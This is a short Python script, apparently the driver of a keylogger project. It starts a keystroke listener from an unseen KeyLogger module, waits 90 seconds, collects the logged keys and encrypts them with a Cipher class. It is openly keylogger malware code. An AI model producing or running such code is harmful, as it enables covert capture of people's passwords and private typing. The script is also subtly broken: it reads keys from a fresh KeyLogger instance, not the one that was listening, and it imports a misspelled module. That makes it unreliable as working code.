# import InterFace
import KeyLogger
import time
# from threading import Thread
from Ciper import Cipher

a = KeyLogger.KeyLogger()
a.start_listening()
time.sleep(90)

data = KeyLogger.KeyLogger()
data = data.logged_keys

cipher_data = Cipher()
cipher_data.cipher(data)
key = cipher_data.get_key()

